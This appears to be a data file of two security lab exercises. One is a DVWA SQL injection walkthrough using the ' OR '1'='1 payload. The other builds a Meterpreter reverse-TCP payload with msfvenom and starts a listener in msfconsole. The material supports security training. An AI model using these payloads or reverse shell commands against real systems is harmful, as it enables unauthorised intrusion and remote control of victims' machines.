title: DVWA SQL Injection Walkthrough
scenario: Learn to exploit SQL injection in DVWA lab environment

steps.title: Set up DVWA
steps.instructions: Start Docker container: docker run -p 80:80 vulnerables/web-dvwa

steps.title: Access DVWA
steps.instructions: Navigate to http://localhost/ in browser, login with admin/password

steps.title: Navigate to SQL Injection
steps.instructions: Click on SQL Injection in left menu

steps.title: Test for vulnerability
steps.instructions: Enter ' OR '1'='1 in the User ID field and submit

title: Metasploit Meterpreter Session
scenario: Create and interact with meterpreter reverse shell

steps.title: Generate payload
steps.instructions: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe

steps.title: Set up listener
steps.instructions: msfconsole -> use exploit/multi/handler -> set LHOST <ip> -> set LPORT <port> -> run
